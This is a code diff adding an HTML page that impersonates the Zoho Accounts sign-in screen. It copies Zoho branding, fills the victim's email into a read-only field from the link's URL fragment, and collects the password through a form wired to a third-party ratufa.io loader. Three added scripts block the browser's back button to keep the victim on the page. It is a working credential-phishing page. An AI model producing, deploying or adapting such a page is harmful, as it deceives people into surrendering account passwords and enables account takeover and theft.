@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoho Accounts</title>
+<link rel="icon" type="image/x-icon" href="https://github.com/cdtechdigital/images/blob/main/Zoho%20Icon.png?raw=true">
+
+    <style>
+        /* Modern Reset & Architectural Layer Hardening */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f3f5f8 0%, #e1e6ef 50%, #f3f5f8 100%);
+            position: relative;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%),
+                        linear-gradient(-45deg, rgba(255,255,255,0.4) 25%, transparent 25%);
+            background-size: 60px 60px;
+            opacity: 0.15;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Hard Centering Gating Module: Enforces layout equilibrium */
+        .gateway-card {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            width: calc(100% - 40px);
+            max-width: 1000px;
+            height: 480px;
+            background-color: #ffffff;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.06), 0 2px 12px rgba(0, 0, 0, 0.03);
+            border-radius: 4px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            overflow: hidden;
+        }
+
+        /* Vertical partition divider between the two columns */
+        .gateway-card::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 50%;
+            width: 1px;
+            background-color: #f1f3f6;
+            z-index: 2;
+        }
+
+        /* Centered Interior Content Layout Blocks */
+        .column {
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            height: 100%;
+        }
+
+        .left-column {
+            background-color: #ffffff;
+            align-items: stretch;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+
+        .form-header {
+            margin-bottom: 20px;
+        }
+
+        .form-header h2 {
+            color: #2c3e50;
+            font-size: 1.4rem;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #7f8c8d;
+            font-size: 0.8rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input, 
+        .form-group textarea {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #dcdde1;
+            border-radius: 4px;
+            background-color: #fcfcfd;
+            color: #2f3640;
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .form-group input:focus, 
+        .form-group textarea:focus {
+            border-color: #1a96ff;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(26, 150, 255, 0.15);
+        }
+
+        .form-group textarea {
+            resize: none;
+            min-height: 80px;
+        }
+
+        /* Precise match of the functional blue button property from your design assets */
+        .action-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a96ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            box-shadow: 0 2px 4px rgba(26, 150, 255, 0.1);
+            margin-top: 5px;
+        }
+
+        .action-btn:hover {
+            background-color: #0084f4;
+        }
+
+        .action-btn:active {
+            transform: scale(0.99);
+        }
+
+        .right-column {
+            background-color: #ffffff;
+            text-align: center;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .illustration-box {
+            width: 100%;
+            max-width: 240px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .illustration-box svg {
+            width: 100%;
+            height: auto;
+        }
+
+        .text-header {
+            color: #111111;
+            font-size: 1.05rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            letter-spacing: -0.2px;
+        }
+
+        .text-description {
+            color: #555555;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            max-width: 300px;
+            margin-bottom: 20px;
+        }
+
+        .link-text {
+            color: #1a96ff;
+            font-size: 0.85rem;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .link-text:hover {
+            text-decoration: underline;
+            color: #0084f4;
+        }
+
+        .carousel-indicator {
+            display: flex;
+            gap: 6px;
+            margin-top: 25px;
+        }
+
+        .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background-color: #e2e8f0;
+        }
+
+        .dot.active {
+            width: 16px;
+            background-color: #1a96ff;
+            border-radius: 4px;
+        }
+
+        /* Fluid layout override configuration for restricted mobile screen spaces */
+        @media (max-width: 768px) {
+            .gateway-card {
+                grid-template-columns: 1fr;
+                position: relative;
+                top: 0;
+                left: 0;
+                transform: none;
+                margin: 20px auto;
+                height: auto;
+            }
+            .gateway-card::after {
+                display: none;
+            }
+            .column {
+                padding: 40px 20px;
+                height: auto;
+            }
+            .left-column {
+                order: 2;
+            }
+            .right-column {
+                border-bottom: 1px solid #f1f3f6;
+                order: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="gateway-card">
+        
+        <!-- LEFT COLUMN MODULE: FORMSUBMIT INTEGRATION ENDPOINT -->
+        <div class="column left-column">
+            <div class="form-container">
+                <div class="form-header">
+                </div>
+                <!-- 
+                     DEVELOPMENT ACTION REQUIREMENT: 
+                     Replace 'your-token-or-email' below with your actual formsubmit.io token or destination company email.
+                -->
+                <form action="" method="POST">
+                    <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                    <div class="form-group">
+<img src="https://raw.githubusercontent.com/cdtechdigital/images/refs/heads/main/ZOHOLOGO.JPG"
+   <br> 
+                        <label for="clientName"></label>
+              
+    <input type="email" name="email" id="email" placeholder="Email address" style=";  " readonly="readonly" />
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="clientEmail"></label>
+                        <input type="password" name="Password" placeholder="Password" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    </div>
+                    
+                    <div class="form-group">
+
+                    </div>
+                    
+                    <button type="submit" class="action-btn">Sign In</button>
+                </form>
+
+            </div>
+        </div>
+        <!-- RIGHT COLUMN MODULE: ACCOUNT VISUALIZATION COMPONENT -->
+        <div class="column right-column">
+            
+            <div class="illustration-box">
+                <svg viewBox="0 0 240 200" xmlns="http://w3.org">
+                    <ellipse cx="120" cy="145" rx="75" ry="25" fill="#f4f5f8"/>
+                    
+                    <rect x="105" y="50" width="62" height="105" rx="8" fill="#4a54a4"/>
+                    <rect x="110" y="58" width="52" height="88" rx="4" fill="#3b438c"/>
+                    
+                    <circle cx="136" cy="98" r="14" fill="none" stroke="#68ebd0" stroke-width="2.5" stroke-dasharray="65 20"/>
+                    <circle cx="136" cy="98" r="8" fill="none" stroke="#68ebd0" stroke-width="1.5"/>
+                    <line x1="126" y1="124" x2="146" y2="124" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+                    <line x1="122" y1="131" x2="150" y2="131" stroke="#525ca3" stroke-width="2" stroke-linecap="round"/>
+                    
+                    <path d="M96,95 C96,95 91,102 96,115 C101,128 103,148 103,148 L111,148 L107,118 L110,102 Z" fill="#111111"/>
+                    <path d="M94,82 Q100,74 105,82 Q107,92 101,98 Q93,94 94,82" fill="#ffbda2"/>
+                    <path d="M92,80 Q98,68 106,78 Q108,82 104,86 Q100,82 96,86 Z" fill="#2d2244"/>
+                    <path d="M96,92 L105,94 L104,115 L95,112 Z" fill="#323a70"/>
+                    <path d="M95,92 Q84,98 81,102 L84,106 Q90,102 96,95 Z" fill="#ffbda2"/>
+                    
+                    <circle cx="125" cy="32" r="11" fill="#1a96ff"/>
+                    <path d="M122,31 L122,29 A3,3 0 0,1 128,29 L128,31 Z" fill="none" stroke="#ffffff" stroke-width="1.5"/>
+                    <rect x="120" y="31" width="10" height="7" rx="1" fill="#ffffff"/>
+                    
+                    <circle cx="180" cy="45" r="13" fill="#4867aa"/>
+                    <text x="176" y="50" font-family="sans-serif" font-size="15" font-weight="bold" fill="#ffffff">f</text>
+                    
+                    <circle cx="70" cy="52" r="11" fill="#1da1f2"/>
+                    <path d="M66,50 Q70,48 74,54" stroke="#ffffff" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+                    
+                    <circle cx="202" cy="78" r="11" fill="#4285f4"/>
+                    <text x="198" y="82" font-family="sans-serif" font-size="11" font-weight="bold" fill="#ffffff">G</text>
+                    
+                    <circle cx="64" cy="95" r="12" fill="#5c6bc0"/>
+                    <rect x="58" y="89" width="5" height="5" fill="#ffffff"/>
+                    <rect x="64" y="89" width="5" height="5" fill="#ffffff"/>
+                    <rect x="58" y="95" width="5" height="5" fill="#ffffff"/>
+                    <rect x="64" y="95" width="5" height="5" fill="#ffffff"/>
+                    
+                    <rect x="160" y="90" width="45" height="15" rx="3" fill="#ffffff"/>
+                    <circle cx="166" cy="97.5" r="2" fill="#1a96ff"/>
+                    <circle cx="172" cy="97.5" r="2" fill="#1a96ff"/>
+                    <circle cx="178" cy="97.5" r="2" fill="#1a96ff"/>
+                    
+                    <circle cx="202" cy="115" r="4" fill="#333333"/>
+                    <line x1="165" y1="115" x2="192" y2="115" stroke="#cbd5e1" stroke-width="3" stroke-linecap="round"/>
+                    
+                    <circle cx="172" cy="142" r="8" fill="#ffffff"/>
+                    <path d="M169,142 A3,3 0 0,1 174,139 L174,141" fill="none" stroke="#718096" stroke-width="1.2" stroke-linecap="round"/>
+                    <path d="M175,142 A3,3 0 0,1 170,145 L170,143" fill="none" stroke="#718096" stroke-width="1.2" stroke-linecap="round"/>
+                </svg>
+            </div>
+
+            <h2 class="text-header">MFA for all accounts</h2>
+            <p class="text-description">
+                Secure online accounts with OneAuth 2FA. Back up OTP secrets and never lose access to your accounts.
+            </p>
+            
+            <a href="#" class="link-text">Learn more</a>
+
+            <div class="carousel-indicator">
+                <span class="dot"></span>
+                <span class="dot active"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+</body>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
